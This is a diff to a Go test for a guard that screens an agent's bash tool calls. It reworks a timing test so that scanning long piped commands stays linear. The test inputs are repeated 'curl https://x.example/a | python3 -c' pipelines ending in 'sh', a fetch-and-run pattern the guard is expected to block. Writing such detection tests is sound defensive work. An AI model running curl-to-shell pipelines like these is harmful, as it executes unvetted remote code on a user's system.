@@ -292,14 +292,20 @@ func TestPipedInterpreterLaterStage(t *testing.T) {
 	}
 }
 
-// Reading the pipelines stays linear: a stage already read is not read again for each match in it.
+// Reading the pipelines stays linear: an interpreter already read from is not read again for
+// each match that ends at it. The bound is relative to the same size of text with no interpreter,
+// which the other rules read just as long (and far longer under -race than the pipe rule).
 func TestPipedInterpreterLinear(t *testing.T) {
-	for _, tail := range []string{"cat", "sh"} {
-		c := strings.Repeat("curl https://x.example/a | python3 -c 'print(1)' | ", 20000) + tail
+	timed := func(c string) (time.Duration, guardHit) {
 		start := time.Now()
 		h := checkToolCall("bash", bashCall(c), "", nil)
-		if d := time.Since(start); d > 5*time.Second {
-			t.Errorf("%s: %v", tail, d)
+		return time.Since(start), h
+	}
+	base, _ := timed(strings.Repeat("curl https://x.example/a | grep -c 'print(1)' | ", 5000) + "cat")
+	for _, tail := range []string{"cat", "sh"} {
+		d, h := timed(strings.Repeat("curl https://x.example/a | python3 -c 'print(1)' | ", 5000) + tail)
+		if d > 3*base+2*time.Second {
+			t.Errorf("%s: %v, %v without an interpreter", tail, d, base)
 		}
 		if (tail == "sh") != h.blocks() {
 			t.Errorf("%s: rule %q", tail, h.rule)
